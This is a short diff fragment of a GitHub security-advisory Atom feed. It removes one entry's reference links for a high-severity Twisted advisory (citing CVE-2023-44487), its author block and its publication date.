-<li><a href="https://github.com/twisted/twisted/commit/498939422b69d5a75c4b8f81fa7926423dac534d">https://github.com/twisted/twisted/commit/498939422b69d5a75c4b8f81fa7926423dac534d</a></li>
-<li><a href="https://github.com/twisted/twisted/releases/tag/twisted-26.10.0rc1">https://github.com/twisted/twisted/releases/tag/twisted-26.10.0rc1</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/cve-2023-44487">https://nvd.nist.gov/vuln/detail/cve-2023-44487</a></li>
-<li><a href="https://github.com/advisories/GHSA-vpp8-g58w-m8mp">https://github.com/advisories/GHSA-vpp8-g58w-m8mp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vpp8-g58w-m8mp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-29T16:41:06.000Z</published>
     </entry>
 </feed>
